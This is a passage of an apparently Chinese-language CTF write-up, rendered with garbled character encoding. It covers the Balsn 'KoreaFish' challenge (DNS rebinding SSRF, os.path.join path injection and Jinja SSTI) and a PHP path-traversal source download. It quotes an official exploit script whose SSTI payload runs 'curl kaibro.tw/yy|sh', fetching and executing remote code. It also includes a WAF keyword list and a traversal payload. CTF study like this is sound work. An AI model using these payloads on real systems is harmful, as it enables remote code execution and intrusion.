class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">&lt;title&gt;KoreaFish&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;form action=<span class="string">"/"</span> method=<span class="string">"get"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"text"</span> name=<span class="string">"ğŸ‡°ğŸ‡·ğŸŸ"</span> placeholder=<span class="string">"http://54.87.54.87/koreafish?id=1"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;hr&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">'default_socket_timeout'</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">$waf = <span class="keyword">array</span>(<span class="string">"@"</span>,<span class="string">"#"</span>,<span class="string">"!"</span>,<span class="string">"$"</span>,<span class="string">"%"</span>,<span class="string">"&lt;"</span>, <span class="string">"*"</span>, <span class="string">"'"</span>, <span class="string">"&amp;"</span>, <span class="string">".."</span>, <span class="string">"localhost"</span>, <span class="string">"file"</span>, <span class="string">"gopher"</span>, <span class="string">"flag"</span>, <span class="string">"information_schema"</span>, <span class="string">"select"</span>, <span class="string">"from"</span>, <span class="string">"sleep"</span>, <span class="string">"user"</span>, <span class="string">"where"</span>, <span class="string">"union"</span>, <span class="string">".php"</span>, <span class="string">"system"</span>, <span class="string">"access.log"</span>, <span class="string">"passwd"</span>, <span class="string">"cmdline"</span>, <span class="string">"exe"</span>, <span class="string">"fd"</span>, <span class="string">"meta-data"</span>);</span><br><span class="line"></span><br><span class="line">$dst = @$_GET[<span class="string">'ğŸ‡°ğŸ‡·ğŸŸ'</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($dst)) <span class="keyword">exit</span>(<span class="string">"Forbidden"</span>);</span><br><span class="line"></span><br><span class="line">$res = @parse_url($dst);</span><br><span class="line">$ip = @dns_get_record($res[<span class="string">'host'</span>], DNS_A)[<span class="number">0</span>][<span class="string">'ip'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($res[<span class="string">'scheme'</span>] !== <span class="string">'http'</span> &amp;&amp; $res[<span class="string">'scheme'</span>] !== <span class="string">'https'</span>) <span class="keyword">die</span>(<span class="string">"Error"</span>);</span><br><span class="line"><span class="keyword">if</span>(stripos($res[<span class="string">'path'</span>], <span class="string">"korea"</span>) === <span class="keyword">FALSE</span>) <span class="keyword">die</span>(<span class="string">"Error"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; count($waf); $i++) </span><br><span class="line">    <span class="keyword">if</span>(stripos($dst, $waf[$i]) !== <span class="keyword">FALSE</span>)</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"&lt;svg/onload=\"alert('ç™¼å¤§è²¡!')\"&gt;"</span>.$waf[$i]);</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// u can only touch this useless ip :p</span></span><br><span class="line">$dev_ip = <span class="string">"54.87.54.87"</span>;</span><br><span class="line"><span class="keyword">if</span>($ip === $dev_ip) &#123;</span><br><span class="line">    $content = file_get_contents($dst);</span><br><span class="line">    <span class="keyword">echo</span> $content;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆé€šè¿‡parse_urlè§£æåŸŸåæ‹¿åˆ°å¯¹åº”ipï¼Œæ¥ä¸‹æ¥åˆ¤æ–­åè®®ï¼Œå¹¶ä¸”åˆ¤æ–­è·¯å¾„ä¸­æ˜¯å¦å­˜åœ¨korea,å¦‚æœä¸å­˜åœ¨çš„è¯å°±è¿”å›Errorï¼Œè¿™ä¸ªé™åˆ¶æ¡ä»¶éœ€è¦æˆ‘ä»¬æ˜¯httpæˆ–è€…httpsåè®®ï¼Œå¹¶ä¸”åœ¨pathä¸­æœ‰koreaï¼Œæ¥ä¸‹æ¥å†å»æ£€æµ‹payloadæœ‰æ— wafæ•°ç»„å…³é”®å­—ï¼Œæœ€åå¦‚æœ$ipç­‰äºç»™å®šçš„ipå°±ä¼šé€šè¿‡file_get_contentså»è®¿é—®æˆ‘ä»¬payloadã€‚</p>
<p>åœ¨ä¸Šé¢æˆ‘ä»¬å¯ä»¥å‘ç°dns_get_recordå‡½æ•°ï¼Œè¿™æ˜¯ç”¨æ¥è·å–ä¸»æœºçš„DNSè®°å½•çš„å‡½æ•°ï¼Œé¢˜ç›®ä¸­æ˜¯é€šè¿‡è¿™ä¸ªå‡½æ•°å…ˆå»æ‹¿åˆ°ip,æœ€åå†å»file_get_contentsæˆ‘ä»¬çš„åŸŸåpayloadã€‚</p>
<p>é‚£ä¹ˆè¿™é‡Œå°±å¯ä»¥é€šè¿‡dnsé‡ç»‘å®šæ”»å‡»æ¥å®ç°ç¬¬ä¸€æ¬¡æ‹¿åˆ°çš„æ˜¯é¢˜ç›®ä¸­éœ€è¦54.87.54.87è¿™ä¸ªipï¼Œç¬¬äºŒæ¬¡file_get_contentsç›´æ¥å»è®¿é—®æˆ‘ä»¬çš„payloadåŸŸåï¼Œé‚£ä¹ˆç¬¬äºŒæ¬¡è§£æçš„å°±æ˜¯127.0.0.1äº†ï¼Œè¿™æ ·å°±å¯ä»¥çœ‹åˆ°å†…ç½‘çš„flaskæœåŠ¡å™¨äº†</p>
<p>dnsé‡ç»‘å®šæ”»å‡»åœ¨çº¿ç½‘ç«™ï¼ˆçœŸçš„å¥½ç”¨ï¼‰</p>
<p><a href="https://lock.cmpxchg8b.com/rebinder.html" target="_blank" rel="noopener">https://lock.cmpxchg8b.com/rebinder.html</a></p>
<p>é¦–å…ˆè¿˜æ˜¯å…ˆå†™ä¸€ä¸‹dnsé‡ç»‘å®šæ”»å‡»çš„åŸç†ï¼š</p>
<ul>
<li>åœ¨æˆ‘ä»¬ç»™æµè§ˆå™¨æˆ‘ä»¬æƒ³è¦è®¿é—®çš„åŸŸåçš„æ—¶å€™ï¼Œæµè§ˆå™¨é€šè¿‡å‘DNSæœåŠ¡å™¨å‘é€è¯·æ±‚å°†è¾“å…¥çš„åŸŸåè§£æä¸ºå¯¹åº”çš„IP</li>
<li>TTLæ¦‚å¿µï¼šTTLè¡¨ç¤ºDNSé‡Œé¢åŸŸåå’ŒIPç»‘å®šå…³ç³»çš„Cacheåœ¨DNSä¸Šå­˜æ´»çš„æœ€é•¿æ—¶é—´ã€‚å½“è¯·æ±‚äº†è¿™ä¸ªåŸŸåå¹¶ä¸”é€šè¿‡dnsæœåŠ¡å™¨æŠŠè¿™ä¸ªåŸŸåè§£æä¸ºå¯¹åº”çš„ipåï¼Œé‚£ä¹ˆè¿™ä¸ªå…³ç³»å°±ä¼šè¢«ç¼“å­˜ï¼Œç¼“å­˜çš„æ—¶é—´ç§°ä¸ºTTLï¼Œå½“ç¼“å­˜å¤±æ•ˆåï¼Œè¿™ä¸ªåŸŸåå’Œipçš„å…³ç³»å°±ä¼šå¤±æ•ˆï¼Œå†æ¬¡è¯·æ±‚åŸŸåçš„è¯ï¼Œåˆ™ä¼šé‡æ–°åŒ¹é…å¯¹åº”çš„ip</li>
</ul>
<blockquote>
<p>è€Œdnså°±æ˜¯åˆ©ç”¨è¿™ä¸ªæ¥å®ç°çš„ã€‚å½“ç”¨æˆ·ç¬¬ä¸€æ¬¡è®¿é—®ï¼Œè§£æåŸŸåè·å–ä¸€ä¸ªIPåœ°å€ï¼›ç„¶åï¼ŒåŸŸåæŒæœ‰è€…ä¿®æ”¹é€šè¿‡æŸç§æ–¹å¼å¯¹åº”çš„IPåœ°å€ï¼›ç”¨æˆ·å†æ¬¡è¯·æ±‚è¯¥åŸŸåï¼Œå°±ä¼šè·å–ä¸€ä¸ªæ–°çš„IPåœ°å€ã€‚å¯¹äºæµè§ˆå™¨æ¥è¯´ï¼Œæ•´ä¸ªè¿‡ç¨‹è®¿é—®çš„éƒ½æ˜¯åŒä¸€åŸŸåï¼Œæ‰€ä»¥è®¤ä¸ºæ˜¯å®‰å…¨çš„ã€‚è¿™å°±é€ æˆäº†DNS Rebindingæ”»å‡»ã€‚</p>
</blockquote>
<p>DNSé‡ç»‘å®šæ”»å‡»æœ€å¥½çš„TTLæ—¶é—´å°±æ˜¯0ï¼Œç¬¬äºŒæ¬¡è®¿é—®è¿™ä¸ªåŸŸåç›´æ¥è§£æåˆ°å¦ä¸€ä¸ªipä¸Š</p>
<p><img src="https://s2.ax1x.com/2019/10/25/KdqoJH.png" alt="KdqoJH.png"></p>
<p>æ¥ç€åˆ†æflaskéƒ¨åˆ†çš„ä»£ç </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, redirect, url_for, session, render_template_string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sanitize</span><span class="params">(str)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> str.replace(<span class="string">"."</span>, <span class="string">""</span>).replace(<span class="string">"&#123;&#123;"</span>, <span class="string">""</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/ping')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ping</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"pong"</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/flag')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"ğŸ‡¹ğŸ‡¼"</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/koreafish')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">koreafish</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        id = request.args.get(<span class="string">"id"</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'fish.html'</span>, id=id)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">"/error_page?err=no_id.html"</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/koreacat')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cat</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        id = request.args.get(<span class="string">"id"</span>)</span><br><span class="line">        <span class="keyword">if</span> int(id) &gt; <span class="number">5</span> <span class="keyword">or</span> int(id) &lt; <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> redirect(<span class="string">"/error_page?err=id_range.html"</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'cat.html'</span>, id=id)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">"/error_page?err=no_id.html"</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/error_page')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">error</span><span class="params">()</span>:</span></span><br><span class="line">    error_status = request.args.get(<span class="string">"err"</span>)</span><br><span class="line">    err_temp_path = os.path.join(<span class="string">'/var/www/flask/'</span>, <span class="string">'error'</span>, error_status)</span><br><span class="line">    <span class="keyword">with</span> open(err_temp_path, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.read().strip()</span><br><span class="line">    <span class="keyword">return</span> render_template_string(sanitize(content))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, threaded=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>å…³é”®æ¼æ´éƒ¨åˆ†ä»£ç </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/error_page')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">error</span><span class="params">()</span>:</span></span><br><span class="line">    error_status = request.args.get(<span class="string">"err"</span>)</span><br><span class="line">    err_temp_path = os.path.join(<span class="string">'/var/www/flask/'</span>, <span class="string">'error'</span>, error_status)</span><br><span class="line">    <span class="keyword">with</span> open(err_temp_path, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.read().strip()</span><br><span class="line">    <span class="keyword">return</span> render_template_string(sanitize(content))</span><br></pre></td></tr></table></figure>

<p>çœ‹æ¥è¿™é‡Œè°ƒç”¨äº†render_template_stringï¼Œé‚£ä¹ˆè¿™æ ·æ˜¯å­˜åœ¨SSTIçš„ï¼Œè·Ÿè¿›sanitizeå‡½æ•°</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sanitize</span><span class="params">(str)</span>:</span></span><br><span class="line">  <span class="keyword">return</span> str.replace(<span class="string">"."</span>, <span class="string">""</span>).replace(<span class="string">"&#123;&#123;"</span>, <span class="string">""</span>)</span><br></pre></td></tr></table></figure>

<p>è¿›è¡Œäº†ä¸€äº›å¸¸è§çš„sstiè¿‡æ»¤</p>
<p>æ¥ç€æ¥çœ‹è¿™ä¸ªå‡½æ•°</p>
<p>error_statusé€šè¿‡getå‹å‚æ•°errè¿›è¡Œè·å–ï¼Œé€šè¿‡ç»„åˆæ‹¿åˆ°æ–‡ä»¶è·¯å¾„</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">err_temp_path = os.path.join(<span class="string">'/var/www/flask/'</span>, <span class="string">'error'</span>, error_status)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>os.path.joinæ˜¯æœ‰ä¸€ä¸ªå¾ˆæœ‰è¶£çš„å‡½æ•°</p>
<p>os.path.join()å‡½æ•°</p>
<p>è¯­æ³•ï¼š  os.path.join(path1[,path2[,â€¦â€¦]])</p>
<p>è¿”å›å€¼ï¼šå°†å¤šä¸ªè·¯å¾„ç»„åˆåè¿”å›</p>
<p>æ³¨ï¼šç¬¬ä¸€ä¸ªç»å¯¹è·¯å¾„ä¹‹å‰çš„å‚æ•°å°†è¢«å¿½ç•¥</p>
</blockquote>
<p>æœ‰è¶£çš„ç‚¹å°±æ˜¯ç»å¯¹è·¯å¾„ä¹‹å‰çš„å‚æ•°å°†è¢«å¿½ç•¥</p>
<p><img src="https://s2.ax1x.com/2019/10/25/KwSYr9.png" alt="KwSYr9.png"></p>
<p>é‚£ä¹ˆæ¥ä¸‹æ¥æ‰¾åˆ°ä¸€ä¸ªå¯æ§æ–‡ä»¶å°±å¯ä»¥äº†ï¼Œæ§åˆ¶é‡Œé¢çš„å†…å®¹ï¼Œé€šè¿‡Flaskçš„è¿™ä¸ªæœåŠ¡æ‰“å¼€è¿™ä¸ªè·¯å¾„çš„å†…å®¹ï¼Œè¿›è¡ŒSSTIã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡PHP_SESSION_UPLOAD_PROGRESSå¾—åˆ°å¯æ§æ•°æ®ï¼ŒæˆåŠŸSSTIã€‚</p>
<p>è¿™é‡Œæ¯”HITCON2018çš„ One-line-php-challengeæ˜¯è¦èˆ’æœä¸€äº›çš„ï¼Œå› ä¸ºåœ¨hitcon2018ä¸­ï¼Œorangeå¸ˆå‚…æŠŠè¿™ä¸ªæ–‡ä»¶çš„å¼€å¤´å­—ç¬¦é™åˆ¶äº†ï¼Œæ‰€ä»¥å¿…é¡»è¦é€šè¿‡å¤šæ¬¡base64-decodeæ‰èƒ½å®ç°ï¼Œè¿™ä¸ªå°±ä¸ç”¨äº†ï¼Œç›´æ¥SSTIå°±å¯ä»¥äº†ã€‚å®˜æ–¹expå¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> sample, randint</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">'http://koreanfish4.balsnctf.com/index.php'</span></span><br><span class="line">sess_name = <span class="string">'iamkaibro'</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'Connection'</span>: <span class="string">'close'</span>, </span><br><span class="line">    <span class="string">'Cookie'</span>: <span class="string">'PHPSESSID='</span> + sess_name</span><br><span class="line">&#125;</span><br><span class="line">// [].__class__===[][<span class="string">'__class__'</span>]  //SSTIè¿‡æ»¤Bypass</span><br><span class="line">// &#123;&#123;&#125;&#125;-&gt;&#123;% %&#125; //SSTIè¿‡æ»¤Bypassa</span><br><span class="line">payload = <span class="string">"""</span></span><br><span class="line"><span class="string">&#123;% for c in []['__class__']['__base__']['__subclasses__']() %&#125;</span></span><br><span class="line"><span class="string">&#123;% if c['__name__'] == 'catch_warnings' %&#125;</span></span><br><span class="line"><span class="string">&#123;% for b in c['__init__']['__globals__']['values']() %&#125;</span></span><br><span class="line"><span class="string">&#123;% if b['__class__']==&#123;&#125;['__class__'] %&#125;</span></span><br><span class="line"><span class="string">&#123;% if 'eval' in b['keys']() %&#125;</span></span><br><span class="line"><span class="string">&#123;% if b['eval']('__import__("os")\\x2epopen("curl kaibro\\x2etw/yy\\x7csh")') %&#125;&#123;% endif %&#125;</span></span><br><span class="line"><span class="string">&#123;% endif %&#125;</span></span><br><span class="line"><span class="string">&#123;% endif %&#125;</span></span><br><span class="line"><span class="string">&#123;% endfor %&#125;</span></span><br><span class="line"><span class="string">&#123;% endif %&#125;</span></span><br><span class="line"><span class="string">&#123;% endfor %&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">runner1</span><span class="params">(i)</span>:</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'PHP_SESSION_UPLOAD_PROGRESS'</span>: payload</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        fp = open(<span class="string">'/etc/passwd'</span>, <span class="string">'rb'</span>)</span><br><span class="line">        r = requests.post(HOST, files=&#123;<span class="string">'f'</span>: fp&#125;, data=data, headers=headers)</span><br><span class="line">        fp.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">runner2</span><span class="params">(i)</span>:</span></span><br><span class="line">    filename = <span class="string">'/var/lib/php/sessions/sess_'</span> + sess_name</span><br><span class="line">    <span class="comment"># print filename</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        url = <span class="string">'&#123;&#125;?%F0%9F%87%B0%F0%9F%87%B7%F0%9F%90%9F=http://36573657.7f000001.rbndr.us:5000//korea/error_page%3Ferr=&#123;&#125;'</span>.format(HOST, filename)</span><br><span class="line">        r = requests.get(url, headers=headers)</span><br><span class="line">        c = r.content</span><br><span class="line">        <span class="keyword">print</span> [c]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">'1'</span>:</span><br><span class="line">    runner = runner1</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    runner = runner2</span><br><span class="line"></span><br><span class="line">pool = ThreadPool(<span class="number">32</span>)</span><br><span class="line">result = pool.map_async( runner, range(<span class="number">32</span>) ).get(<span class="number">0xffff</span>)</span><br></pre></td></tr></table></figure>

<h3 id="å·…å³°æå®¢lol"><a href="#å·…å³°æå®¢lol" class="headerlink" title="å·…å³°æå®¢lol"></a>å·…å³°æå®¢lol</h3><p>è¿™é“é¢˜çš„ä¸»è¦é—®é¢˜åœ¨äºæºç çš„ä¸‹è½½ï¼Œåªè¦ä¸‹è½½å‡ºæ¥æºç ï¼Œæˆ‘ä»¬å°±å¯ä»¥çœ‹å‡ºæ˜¯sessionååºåˆ—åŒ–äº†ã€‚</p>
<p>æ–‡ä»¶ä¸Šä¼ ä¸Šå»ç”Ÿæˆæ–‡ä»¶å¦‚ï¼šupload/phpsessid/phpsessid.jpg</p>
<p>åŒæ ·æ–‡ä»¶çš„ä¸‹è½½ä¹Ÿæ˜¯é€šè¿‡phpsessidï¼Œèµ›åçœ‹æºç å¯ä»¥æ›´æ¸…æ¥šçš„çœ‹åˆ°è¿™ä¸€ç‚¹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">download</span><span class="params">($param)</span></span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Download(Upload_DIR.DS.<span class="keyword">$this</span>-&gt;data[<span class="string">'param'</span>]);</span><br><span class="line">    &#125; </span><br><span class="line"><span class="comment">//define('Upload_DIR',Image_DIR.DS.session_id());</span></span><br><span class="line"><span class="comment">//define('Image_DIR',APP_DIR.DS.'upload');</span></span><br></pre></td></tr></table></figure>

<p>é‚£ä¹ˆæ¯”å¦‚æƒ³è¦ä¸‹è½½index.phpçš„è¯</p>
<p>Payloadå¦‚ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">download&#x2F;index.php</span><br><span class="line"></span><br><span class="line">PHPSESSID&#x3D;upload&#x2F;..&#x2F;..&#x2F;index.php</span><br></pre></td></tr></table></figure>

<p>å³å¯æˆåŠŸä¸‹è½½index.php</p>
<p>åœ¨index.phpæ˜¯æœ‰å…¶ä»–æ–‡ä»¶çš„è·¯åŠ²çš„ï¼Œé€šè¿‡ä¸Šé¢çš„æ–¹æ³•å³å¯æŠŠæ‰€æœ‰æºç ä¸‹è½½å®Œæ¯•</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">defined(<span class="string">'DS'</span>) <span class="keyword">or</span> define(<span class="string">'DS'</span>, DIRECTORY_SEPARATOR);</span><br><span class="line">define(<span class="string">'APP_DIR'</span>, realpath(<span class="string">'./'</span>));</span><br><span class="line">define(<span class="string">'Cache_DIR'</span>,APP_DIR.DS.<span class="string">'user'</span>);</span><br><span class="line">define(<span class="string">'View_DIR'</span>,APP_DIR.DS.<span class="string">'app'</span>.DS.<span class="string">'view'</span>);</span><br><span class="line">define(<span class="string">'Core_DIR'</span>,APP_DIR.DS.<span class="string">'core'</span>);</span><br><span class="line">define(<span class="string">'Image_DIR'</span>,APP_DIR.DS.<span class="string">'upload'</span>);</span><br><span class="line"><span class="keyword">include</span>(Core_DIR.DS.<span class="string">'core.php'</span>);</span><br></pre></td></tr></table></figure>

<p>ä¸»è¦æ¼æ´ç‚¹åœ¨äºCache.class.phpç¼“å­˜</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cache</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $data;</span><br><span class="line">    <span class="keyword">public</span> $sj;</span><br><span class="line">    <span class="keyword">public</span> $path;</span><br><span class="line">    <span class="keyword">public</span> $html;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="string">'name'</span>]=<span class="keyword">isset</span>($data[<span class="string">'post'</span>][<span class="string">'name'</span>])?$data[<span class="string">'post'</span>][<span class="string">'name'</span>]:<span class="string">''</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="string">'message'</span>]=<span class="keyword">isset</span>($data[<span class="string">'post'</span>][<span class="string">'message'</span>])?$data[<span class="string">'post'</span>][<span class="string">'message'</span>]:<span class="string">''</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="string">'image'</span>]=!<span class="keyword">empty</span>($data[<span class="string">'image'</span>])?$data[<span class="string">'image'</span>]:<span class="string">'/static/images/pic04.jpg'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;path=Cache_DIR.DS.session_id().<span class="string">'.php'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;html=sprintf(<span class="string">'&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;LOL&lt;/title&gt;&lt;meta charset="utf-8" /&gt;&lt;meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" /&gt;&lt;link rel="stylesheet" href="/static/css/main.css" /&gt;&lt;noscript&gt;&lt;link rel="stylesheet" href="/static/css/noscript.css" /&gt;&lt;/noscript&gt;   &lt;/head&gt; &lt;body class="is-preload"&gt;&lt;div id="wrapper"&gt;&lt;header id="header"&gt; &lt;div class="logo"&gt;&lt;span class="icon fa-diamond"&gt;&lt;/span&gt; &lt;/div&gt;  &lt;div class="content"&gt;&lt;div class="inner"&gt;    &lt;h1&gt;Hero of you&lt;/h1&gt;&lt;/div&gt;  &lt;/div&gt;  &lt;nav&gt;&lt;ul&gt;   &lt;li&gt;&lt;a href="#you"&gt;YOU&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;    &lt;/nav&gt;&lt;/header&gt;&lt;div id="main"&gt;&lt;article id="you"&gt;    &lt;h2 class="major" ng-app&gt;%s&lt;/h2&gt;    